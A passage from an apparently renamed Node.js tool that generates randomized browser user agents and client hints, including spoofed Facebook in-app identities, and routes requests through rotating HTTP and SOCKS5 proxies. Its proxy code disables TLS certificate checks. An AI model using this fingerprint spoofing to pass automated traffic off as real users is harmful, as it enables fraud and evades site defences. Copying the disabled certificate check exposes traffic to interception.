        'h': 0x393,
        'dpr': v357.dpr,
        'cores': 0x8,
        'ram': v357.ram
      },
      'device': v357
    };
  }
}
function getSamsungUserAgent() {
  const v369 = ANDROID_DEVICES.filter(v373 => v373.brand === "Samsung"),
    v370 = v369[Math.floor(Math.random() * v369.length)] || ANDROID_DEVICES[0x0],
    v371 = SAMSUNG_VERSIONS[Math.floor(Math.random() * SAMSUNG_VERSIONS.length)],
    v372 = v371.chrome.split('.')[0x0];
  return {
    'name': "Samsung Internet",
    'userAgent': "Mozilla/5.0 (Linux; Android " + v370.os + ';\x20' + v370.model + ") AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/" + v371.ver + " Chrome/" + v372 + ".0.0.0 Mobile Safari/537.36",
    'browserType': "samsung",
    'isMobile': true,
    'clientHints': {
      'sec-ch-ua': "\"Not?A_Brand\";v=\"24\", \"Samsung Internet\";v=\"" + v371.ver.split('.')[0x0] + "\", \"Chromium\";v=\"" + v372 + '\x22',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-model': '\x22' + v370.model + '\x22',
      'sec-ch-ua-platform': "\"Android\"",
      'sec-ch-ua-platform-version': '\x22' + v370.os + ".0.0\"",
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopChromeUA() {
  const v374 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)];
  const v375 = Math.floor(Math.random() * (v374.maxPatch - v374.minPatch + 0x1)) + v374.minPatch,
    v376 = v374.major + ".0." + v374.build + '.' + v375,
    v377 = GREASE_MAP_FP[v374.major] || "\"Not?A_Brand\";v=\"24\"",
    v378 = ["\"10.0.0\"", "\"15.0.0\"", "\"19.0.0\""],
    v379 = v378[Math.floor(Math.random() * v378.length)];
  return {
    'name': "Windows Chrome",
    'userAgent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v374.major + ".0.0.0 Safari/537.36",
    'browserType': "chrome",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Chromium\";v=\"" + v374.major + "\", " + v377 + ", \"Google Chrome\";v=\"" + v374.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v376 + "\", " + v377.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Google Chrome\";v=\"" + v376 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Windows\"",
      'sec-ch-ua-platform-version': v379,
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopLinuxChromeUA() {
  const v380 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v381 = Math.floor(Math.random() * (v380.maxPatch - v380.minPatch + 0x1)) + v380.minPatch;
  const v382 = v380.major + ".0." + v380.build + '.' + v381,
    v383 = GREASE_MAP_FP[v380.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Linux Chrome",
    'userAgent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v380.major + ".0.0.0 Safari/537.36",
    'browserType': "chrome_linux",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Chromium\";v=\"" + v380.major + "\", " + v383 + ", \"Google Chrome\";v=\"" + v380.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v382 + "\", " + v383.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Google Chrome\";v=\"" + v382 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Linux\"",
      'sec-ch-ua-platform-version': '\x22\x22',
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopLinuxFirefoxUA() {
  const v384 = Math.floor(Math.random() * 0xf) + 0x82;
  const v385 = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:" + v384 + ".0) Gecko/20100101 Firefox/" + v384 + '.0', "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:" + v384 + ".0) Gecko/20100101 Firefox/" + v384 + '.0', "Mozilla/5.0 (X11; Linux x86_64; rv:" + v384 + ".0) Gecko/20100101 Firefox/" + v384 + '.0'];
  return {
    'name': "Linux Firefox",
    'userAgent': v385[Math.floor(Math.random() * v385.length)],
    'browserType': "firefox_linux",
    'isMobile': false,
    'clientHints': {}
  };
}
function getDesktopLinuxBraveUA() {
  const v386 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v387 = Math.floor(Math.random() * (v386.maxPatch - v386.minPatch + 0x1)) + v386.minPatch;
  const v388 = v386.major + ".0." + v386.build + '.' + v387,
    v389 = GREASE_MAP_FP[v386.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Linux Brave",
    'userAgent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v386.major + ".0.0.0 Safari/537.36",
    'browserType': "brave_linux",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Brave\";v=\"" + v386.major + "\", " + v389 + ", \"Chromium\";v=\"" + v386.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Brave\";v=\"" + v388 + "\", " + v389.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Chromium\";v=\"" + v388 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Linux\"",
      'sec-ch-ua-platform-version': '\x22\x22',
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopLinuxEdgeUA() {
  const v390 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v391 = Math.floor(Math.random() * (v390.maxPatch - v390.minPatch + 0x1)) + v390.minPatch,
    v392 = v390.major + ".0." + v390.build + '.' + v391;
  const v393 = GREASE_MAP_FP[v390.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Linux Edge",
    'userAgent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v390.major + ".0.0.0 Safari/537.36 Edg/" + v390.major + ".0.0.0",
    'browserType': "edge_linux",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Chromium\";v=\"" + v390.major + "\", " + v393 + ", \"Microsoft Edge\";v=\"" + v390.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v392 + "\", " + v393.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Microsoft Edge\";v=\"" + v392 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Linux\"",
      'sec-ch-ua-platform-version': '\x22\x22',
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopEdgeUA() {
  const v394 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v395 = Math.floor(Math.random() * (v394.maxPatch - v394.minPatch + 0x1)) + v394.minPatch;
  const v396 = v394.major + ".0." + v394.build + '.' + v395;
  const v397 = GREASE_MAP_FP[v394.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Windows Edge",
    'userAgent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v394.major + ".0.0.0 Safari/537.36 Edg/" + v394.major + ".0.0.0",
    'browserType': "edge",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Chromium\";v=\"" + v394.major + "\", " + v397 + ", \"Microsoft Edge\";v=\"" + v394.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v396 + "\", " + v397.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Microsoft Edge\";v=\"" + v396 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Windows\"",
      'sec-ch-ua-platform-version': "\"19.0.0\"",
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getDesktopFirefoxUA() {
  const v398 = Math.floor(Math.random() * 0x14) + 0x80,
    v399 = Math.floor(Math.random() * 0x4);
  const v400 = {};
  v400.name = "Windows Firefox";
  return v400.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:" + v398 + '.' + v399 + ") Gecko/20100101 Firefox/" + v398 + '.' + v399, v400.browserType = "firefox", v400.isMobile = false, v400.clientHints = {}, v400;
}
function getDuckDuckGoDesktopUA() {
  const v401 = {};
  v401.major = 0x97, v401.build = 0x1ef2, v401.minPatch = 0x32;
  v401.maxPatch = 0xb4;
  const v402 = CHROME_VERSIONS.find(v405 => v405.major === 0x97) || v401;
  const v403 = v402.major + ".0." + v402.build + '.' + 0x8a,
    v404 = GREASE_MAP_FP[v402.major] || "\"Not=A?Brand\";v=\"99\"";
  return {
    'name': "DuckDuckGo Windows",
    'userAgent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v402.major + ".0.0.0 Safari/537.36",
    'browserType': "duckduckgo",
    'isMobile': false,
    'clientHints': {
      'sec-ch-prefers-color-scheme': "dark",
      'sec-ch-ua': "\"Chromium\";v=\"" + v402.major + "\", " + v404 + ", \"Google Chrome\";v=\"" + v402.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v403 + "\", " + v404.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Google Chrome\";v=\"" + v403 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Windows\"",
      'sec-ch-ua-platform-version': "\"19.0.0\"",
      'sec-gpc': '1'
    },
    'duckduckgo': true
  };
}
function getDesktopOperaUA() {
  const v406 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)];
  const v407 = Math.floor(Math.random() * (v406.maxPatch - v406.minPatch + 0x1)) + v406.minPatch,
    v408 = v406.major + ".0." + v406.build + '.' + v407;
  const v409 = Math.max(0x69, v406.major - 0xa),
    v410 = GREASE_MAP_FP[v406.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Windows Opera",
    'userAgent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v406.major + ".0.0.0 Safari/537.36 OPR/" + v409 + ".0.0.0",
    'browserType': "opera",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Chromium\";v=\"" + v406.major + "\", " + v410 + ", \"Opera\";v=\"" + v409 + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v408 + "\", " + v410.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Opera\";v=\"" + v409 + ".0.0.0\"",
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Windows\"",
      'sec-ch-ua-platform-version': "\"19.0.0\"",
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getMobileOperaUA() {
  const v411 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v412 = Math.floor(Math.random() * (v411.maxPatch - v411.minPatch + 0x1)) + v411.minPatch,
    v413 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v414 = Math.max(0x50, v411.major - 0x3c),
    v415 = GREASE_MAP_FP[v411.major] || "\"Not?A_Brand\";v=\"24\"",
    v416 = {};
  v416.name = "Android Opera", v416.userAgent = "Mozilla/5.0 (Linux; Android " + v413.os + ';\x20' + v413.model + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v411.major + ".0.0.0 Mobile Safari/537.36 OPR/" + v414 + ".0.0.0", v416.browserType = "opera", v416.isMobile = true, v416.clientHints = {}, v416.clientHints["sec-ch-ua"] = "\"Chromium\";v=\"" + v411.major + "\", " + v415 + ", \"Opera\";v=\"" + v414 + '\x22', v416.clientHints["sec-ch-ua-mobile"] = '?1';
  return v416.clientHints["sec-ch-ua-model"] = '\x22' + v413.model + '\x22', v416.clientHints["sec-ch-ua-platform"] = "\"Android\"", v416.clientHints["sec-ch-ua-platform-version"] = '\x22' + v413.os + ".0.0\"", v416.clientHints["sec-ch-prefers-color-scheme"] = "dark", v416;
}
function getDesktopBraveUA() {
  const v417 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)];
  const v418 = Math.floor(Math.random() * (v417.maxPatch - v417.minPatch + 0x1)) + v417.minPatch,
    v419 = v417.major + ".0." + v417.build + '.' + v418,
    v420 = GREASE_MAP_FP[v417.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Windows Brave",
    'userAgent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v417.major + ".0.0.0 Safari/537.36",
    'browserType': "brave",
    'isMobile': false,
    'clientHints': {
      'sec-ch-ua': "\"Brave\";v=\"" + v417.major + "\", " + v420 + ", \"Chromium\";v=\"" + v417.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Brave\";v=\"" + v419 + "\", " + v420.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Chromium\";v=\"" + v419 + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-model': '\x22\x22',
      'sec-ch-ua-platform': "\"Windows\"",
      'sec-ch-ua-platform-version': "\"19.0.0\"",
      'sec-ch-prefers-color-scheme': "dark"
    }
  };
}
function getMobileBraveUA() {
  const v421 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v422 = Math.floor(Math.random() * (v421.maxPatch - v421.minPatch + 0x1)) + v421.minPatch,
    v423 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v424 = GREASE_MAP_FP[v421.major] || "\"Not?A_Brand\";v=\"24\"",
    v425 = {};
  v425.name = "Android Brave", v425.userAgent = "Mozilla/5.0 (Linux; Android " + v423.os + ';\x20' + v423.model + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v421.major + ".0.0.0 Mobile Safari/537.36", v425.browserType = "brave", v425.isMobile = true;
  v425.clientHints = {}, v425.clientHints["sec-ch-ua"] = "\"Brave\";v=\"" + v421.major + "\", " + v424 + ", \"Chromium\";v=\"" + v421.major + '\x22';
  v425.clientHints["sec-ch-ua-mobile"] = '?1', v425.clientHints["sec-ch-ua-model"] = '\x22' + v423.model + '\x22';
  return v425.clientHints["sec-ch-ua-platform"] = "\"Android\"", v425.clientHints["sec-ch-ua-platform-version"] = '\x22' + v423.os + ".0.0\"", v425.clientHints["sec-ch-prefers-color-scheme"] = "dark", v425;
}
function getDesktopVivaldiUA() {
  const v426 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v427 = Math.floor(Math.random() * (v426.maxPatch - v426.minPatch + 0x1)) + v426.minPatch,
    v428 = Math.max(0x7, Math.floor((v426.major - 0x6e) / 0x5) + 0x5),
    v429 = GREASE_MAP_FP[v426.major] || "\"Not?A_Brand\";v=\"24\"",
    v430 = {};
  v430.name = "Windows Vivaldi", v430.userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v426.major + ".0.0.0 Safari/537.36 Vivaldi/" + v428 + ".0.0.0", v430.browserType = "vivaldi", v430.isMobile = false;
  v430.clientHints = {};
  return v430.clientHints["sec-ch-ua"] = "\"Chromium\";v=\"" + v426.major + "\", " + v429 + ", \"Vivaldi\";v=\"" + v428 + '\x22', v430.clientHints["sec-ch-ua-mobile"] = '?0', v430.clientHints["sec-ch-ua-model"] = '\x22\x22', v430.clientHints["sec-ch-ua-platform"] = "\"Windows\"", v430.clientHints["sec-ch-ua-platform-version"] = "\"19.0.0\"", v430.clientHints["sec-ch-prefers-color-scheme"] = "dark", v430;
}
function getMobileFirefoxUA() {
  const v431 = Math.floor(Math.random() * 0x14) + 0x80,
    v432 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)];
  const v433 = {};
  return v433.name = "Android Firefox", v433.userAgent = "Mozilla/5.0 (Android " + v432.os + "; Mobile; rv:" + v431 + ".0) Gecko/" + v431 + ".0 Firefox/" + v431 + '.0', v433.browserType = "firefox", v433.isMobile = true, v433.clientHints = {}, v433;
}
function mfbGenIosUA() {
  const fn6 = (v447, v448) => Math.floor(Math.random() * (v448 - v447 + 0x1)) + v447,
    v434 = {};
  v434.major = 0xf, v434.minors = [0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8], v434.buildBase = 0x13;
  const v435 = {};
  v435.major = 0x10, v435.minors = [0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7], v435.buildBase = 0x14;
  const v436 = {};
  v436.major = 0x11, v436.minors = [0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6];
  v436.buildBase = 0x15;
  const v437 = {};
  v437.major = 0x12, v437.minors = [0x0, 0x1, 0x2, 0x3, 0x4, 0x5], v437.buildBase = 0x16;
  const v438 = [v434, v435, v436, v437],
    v439 = v438[fn6(0x0, v438.length - 0x1)];
  const v440 = v439.minors[fn6(0x0, v439.minors.length - 0x1)];
  const v441 = v439.major <= 0x10 ? Math.random() < 0.4 ? fn6(0x1, 0x2) : 0x0 : Math.random() < 0.2 ? 0x1 : 0x0,
    v442 = String.fromCharCode(0x41 + v440),
    v443 = '' + v439.buildBase + v442 + fn6(0x32, 0x3e7),
    v444 = v439.major + '_' + v440 + (v441 > 0x0 ? '_' + v441 : ''),
    v445 = v439.major + '.' + v440 + (v441 > 0x0 ? '.' + v441 : ''),
    v446 = "iPhone; CPU iPhone OS " + v444 + " like Mac OS X";
  return "Mozilla/5.0 (" + v446 + ") AppleWebKit/605.1.15 (KHTML, like Gecko) Version/" + v445 + " Mobile/" + v443 + " Safari/605.1";
}
function getIosSafariUA() {
  const v449 = mfbGenIosUA(),
    v450 = {};
  v450.name = "iOS Safari (iPhone)", v450.userAgent = v449;
  return v450.browserType = "safari", v450.isMobile = true, v450.clientHints = {}, v450;
}
function getIosFbAppUA() {
  const v451 = IOS_DEVICES[Math.floor(Math.random() * IOS_DEVICES.length)],
    v452 = ["507.0.30.102", "488.0.17.110", "495.0.0.33.112", "510.0.0.28.115", "520.0.0.34.120"][Math.floor(Math.random() * 0x5)],
    v453 = Math.floor(Math.random() * 0x1312d00) + 0x1d34ce80,
    v454 = ["ur_PK", "pt_BR", "en_US", "ar_AR", "es_LA", "fr_FR", "ru_RU"];
  const v455 = v454[Math.floor(Math.random() * v454.length)],
    v456 = ["Ufone", "Vivo Brazil", "AT&T", "Vodafone", "T-Mobile", "Orange", "MegaFon"],
    v457 = v456[Math.floor(Math.random() * v456.length)],
    v458 = "Mozilla/5.0 (" + v451.devCode + "; CPU " + (v451.isTablet ? 'OS' : "iPhone OS") + '\x20' + v451.os + " like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/" + v451.build + " [FBAN/FBIOS;FBAV/" + v452 + ";FBPN/" + v451.app + ";FBLC/" + v455 + ";FBBV/" + v453 + ";FBCR/" + v457 + ";FBMF/Apple;FBBD/Apple;FBDV/" + v451.model + ";FBSV/" + v451.version + ";FBDM/{density=" + v451.density + ",width=" + v451.w + ",height=" + v451.h + "};FBDG/1;FBIA/FBIOS;]",
    v459 = {};
  v459.name = "iOS Facebook In-App", v459.userAgent = v458, v459.browserType = "safari", v459.isMobile = true;
  return v459.clientHints = {}, v459;
}
function getDesktopSafariUA() {
  const v460 = "18.2";
  const v461 = {};
  v461.name = "macOS Safari";
  v461.userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/" + v460 + " Safari/605.1.15", v461.browserType = "safari";
  return v461.isMobile = false, v461.clientHints = {}, v461;
}
function getPixel8MobileUA() {
  const v462 = {};
  v462["sec-ch-ua"] = "\"Not?A_Brand\";v=\"24\", \"Google Chrome\";v=\"152\", \"Chromium\";v=\"152\"", v462["sec-ch-ua-full-version-list"] = "\"Not?A_Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"152.0.7977.66\", \"Chromium\";v=\"152.0.7977.66\"", v462["sec-ch-ua-mobile"] = '?1';
  v462["sec-ch-ua-model"] = "\"Pixel 8\"", v462["sec-ch-ua-platform"] = "\"Android\"", v462["sec-ch-ua-platform-version"] = "\"14.0.0\"", v462["sec-ch-prefers-color-scheme"] = "dark";
  const v463 = {};
  v463.w = 0x19c, v463.h = 0x393, v463.dpr = 2.625, v463.cores = 0x8, v463.ram = 0x8;
  const v464 = {};
  return v464.name = "Pixel 8/9 Chrome 152 (Mobile Web)", v464.userAgent = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36", v464.browserType = "mweb_pixel8", v464.isMobile = true, v464.clientHints = v462, v464.hw = v463, v464;
}
const v101 = {};
v101.fn = getDesktopChromeUA, v101.weight = 0x1a, v101.type = "chrome";
const v102 = {};
v102.fn = getDesktopLinuxChromeUA, v102.weight = 0xf, v102.type = "linux";
const v103 = {};
v103.fn = getPixel8MobileUA, v103.weight = 0xe, v103.type = "mweb_pixel8";
const v104 = {};
v104.fn = getIosSafariUA, v104.weight = 0xc, v104.type = "safari";
const v105 = {};
v105.fn = getDesktopEdgeUA, v105.weight = 0xa, v105.type = "edge";
const v106 = {};
v106.fn = getDesktopLinuxFirefoxUA, v106.weight = 0x8, v106.type = "linux";
const v107 = {};
v107.fn = getDesktopBraveUA, v107.weight = 0x7, v107.type = "brave";
const v108 = {};
v108.fn = getDesktopOperaUA, v108.weight = 0x5, v108.type = "opera";
const v109 = {};
v109.fn = getDesktopFirefoxUA, v109.weight = 0x5, v109.type = "firefox";
const v110 = {};
v110.fn = getDesktopLinuxBraveUA, v110.weight = 0x5, v110.type = "linux";
const v111 = {};
v111.fn = getDesktopLinuxEdgeUA, v111.weight = 0x4, v111.type = "linux";
const v112 = {};
v112.fn = getSamsungUserAgent, v112.weight = 0x4, v112.type = "samsung";
const v113 = {};
v113.fn = getDesktopSafariUA, v113.weight = 0x4, v113.type = "safari";
const v114 = {};
v114.fn = getDesktopVivaldiUA, v114.weight = 0x3, v114.type = "vivaldi";
const v115 = {};
v115.fn = getDuckDuckGoDesktopUA, v115.weight = 0x3, v115.type = "duckduckgo";
const v116 = {};
v116.fn = getIosFbAppUA, v116.weight = 0x2, v116.type = "safari";
const v117 = {};
v117.fn = getMobileBraveUA, v117.weight = 0x2, v117.type = "brave";
const v118 = {};
v118.fn = getMobileOperaUA, v118.weight = 0x2, v118.type = "opera";
const v119 = {};
v119.fn = getMobileFirefoxUA, v119.weight = 0x2, v119.type = "firefox";
const UA_GENERATORS = [v101, v102, v103, v104, v105, v106, v107, v108, v109, v110, v111, v112, v113, v114, v115, v116, v117, v118, v119],
  UA_TOTAL_WEIGHT = UA_GENERATORS.reduce((v465, v466) => v465 + v466.weight, 0x0);
function getViaBrowserUA() {
  const v467 = ANDROID_DEVICES[Math.floor(Math.random() * ANDROID_DEVICES.length)],
    v468 = CHROME_VERSIONS[Math.floor(Math.random() * CHROME_VERSIONS.length)],
    v469 = Math.floor(Math.random() * (v468.maxPatch - v468.minPatch + 0x1)) + v468.minPatch;
  const v470 = v468.major + ".0." + v468.build + '.' + v469,
    v471 = GREASE_MAP_FP[v468.major] || "\"Not?A_Brand\";v=\"24\"";
  return {
    'name': "Via Browser",
    'userAgent': "Mozilla/5.0 (Linux; Android " + v467.os + ';\x20' + v467.model + " Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/" + v468.major + ".0.0.0 Mobile Safari/537.36",
    'browserType': "via_browser",
    'isMobile': true,
    'clientHints': {
      'x-requested-with': "mark.via.gp",
      'sec-ch-ua': "\"Chromium\";v=\"" + v468.major + "\", " + v471 + ", \"Android WebView\";v=\"" + v468.major + '\x22',
      'sec-ch-ua-full-version-list': "\"Chromium\";v=\"" + v470 + "\", " + v471.replace(/;v="(\d+)"/, ";v=\"$1.0.0.0\"") + ", \"Android WebView\";v=\"" + v470 + '\x22',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-model': '\x22' + v467.model + '\x22',
      'sec-ch-ua-platform': "\"Android\"",
      'sec-ch-ua-platform-version': '\x22' + v467.os + ".0.0\"",
      'sec-ch-prefers-color-scheme': "light"
    }
  };
}
function getRandomUserAgent(v472) {
  let v473 = v472;
  (!v473 || v473 === SELECTED_BROWSER) && (SELECTED_BROWSERS && SELECTED_BROWSERS.length > 0x1 ? v473 = SELECTED_BROWSERS[Math.floor(Math.random() * SELECTED_BROWSERS.length)] : v473 = SELECTED_BROWSER);
  if (v473 === "via_browser") return getViaBrowserUA();
  if (v473 === "duckduckgo") return getDuckDuckGoDesktopUA();
  if (v473 && v473 !== "random") {
    const v475 = UA_GENERATORS.filter(v476 => v476.type === v473);
    if (v475.length > 0x0) return v475[Math.floor(Math.random() * v475.length)].fn();
  }
  let v474 = Math.random() * UA_TOTAL_WEIGHT;
  for (const v477 of UA_GENERATORS) {
    v474 -= v477.weight;
    if (v474 <= 0x0) return v477.fn();
  }
  return getDesktopChromeUA();
}
let globalUA = getRandomClient(SELECTED_BROWSER),
  internalUA = getRandomClient(SELECTED_BROWSER);
function syncUAAndHost() {
  globalUA = getRandomClient(SELECTED_BROWSER);
  internalUA = getRandomClient(SELECTED_BROWSER);
}
function parseProxy(v478) {
  if (!v478 || typeof v478 !== "string") return null;
  v478 = v478.trim();
  if (!v478 || v478.startsWith('#')) return null;
  let v479 = "http";
  if (v478.startsWith("socks5://") || v478.startsWith("socks4://")) v479 = "socks5", v478 = v478.replace(/^socks[45]:\/\//i, '');else (v478.startsWith("http://") || v478.startsWith("https://")) && (v479 = "http", v478 = v478.replace(/^https?:\/\//i, ''));
  if (v478.includes('@')) {
    const v481 = v478.lastIndexOf('@'),
      v482 = v478.substring(0x0, v481),
      v483 = v478.substring(v481 + 0x1),
      v484 = v482.split(':'),
      v485 = v483.split(':');
    if (v485.length === 0x2 && !isNaN(parseInt(v485[0x1]))) return {
      'type': v479,
      'host': v485[0x0],
      'port': parseInt(v485[0x1]),
      'user': v484[0x0] || null,
      'pass': v484[0x1] || null
    };
    if (v484.length === 0x2 && !isNaN(parseInt(v484[0x1]))) return {
      'type': v479,
      'host': v484[0x0],
      'port': parseInt(v484[0x1]),
      'user': v485[0x0] || null,
      'pass': v485[0x1] || null
    };
  }
  const v480 = v478.split(':');
  if (v480.length === 0x2) {
    const v486 = parseInt(v480[0x1]);
    if (!isNaN(v486) && v486 > 0x0 && v486 <= 0xffff) {
      const v487 = {};
      return v487.type = v479, v487.host = v480[0x0], v487.port = v486, v487.user = null, v487.pass = null, v487;
    }
  }
  if (v480.length === 0x4) {
    const v488 = parseInt(v480[0x1]),
      v489 = parseInt(v480[0x3]);
    if (!isNaN(v488) && v488 > 0x0 && v488 <= 0xffff) {
      const v490 = {};
      return v490.type = v479, v490.host = v480[0x0], v490.port = v488, v490.user = v480[0x2], v490.pass = v480[0x3], v490;
    }
    if (!isNaN(v489) && v489 > 0x0 && v489 <= 0xffff) {
      const v491 = {};
      return v491.type = v479, v491.host = v480[0x2], v491.port = v489, v491.user = v480[0x0], v491.pass = v480[0x1], v491;
    }
  }
  return null;
}
function createHttpProxyAgent(v492) {
  const v493 = v492.user && v492.pass ? "Basic " + Buffer.from(v492.user + ':' + v492.pass).toString("base64") : null,
    v494 = {};
  v494.keepAlive = false;
  const v495 = new https.Agent(v494);
  v495.createConnection = (v496, v497) => {
    let v498 = null;
    const v499 = net.connect(v492.port, v492.host, () => {
      let v501 = "CONNECT " + v496.host + ':' + v496.port + " HTTP/1.1\r\n" + ("Host: " + v496.host + ':' + v496.port + '\x0d\x0a');
      if (v493) v501 += "Proxy-Authorization: " + v493 + '\x0d\x0a';
      v501 += '\x0d\x0a', v499.write(v501);
    });
    v498 = setTimeout(() => {
      v499.destroy();
      v497(new Error("Proxy TCP timeout (" + v492.host + ':' + v492.port + ')'));
    }, 0x2710);
    let v500 = '';
    const fn7 = v502 => {
        v500 += v502.toString("binary");
        const v503 = v500.indexOf("\r\n\r\n");
        if (v503 !== -1) {
          if (v498) clearTimeout(v498);
          v499.removeListener("data", fn7), v499.removeListener("error", fn8);
          const v504 = v500.split('\x0d\x0a')[0x0];
          if (v504.includes(" 200")) {
            const v505 = Buffer.from(v500.substring(v503 + 0x4), "binary");
            if (v505.length > 0x0) v499.unshift(v505);
            const v506 = {};
            v506.socket = v499, v506.servername = v496.host, v506.rejectUnauthorized = false;
            const v507 = tls.connect(v506);
            v507.on("error", v508 => {
              v497(v508);
            }), v497(null, v507);
          } else v499.destroy(), v497(new Error("Proxy connection failed: " + v504));
        }
      },
      fn8 = v509 => {
        if (v498) clearTimeout(v498);
        v499.destroy(), v497(v509);
      };
    v499.on("data", fn7);
    v499.on("error", fn8);
  };
  return v495;
}
function createSocks5ProxyAgent(v510) {
  const v511 = {};
  v511.keepAlive = false;
  const v512 = new https.Agent(v511);
  return v512.createConnection = (v513, v514) => {
    let v515 = null;
    const v516 = net.connect(v510.port, v510.host, () => {
      const v519 = v510.user ? [0x0, 0x2] : [0x0],
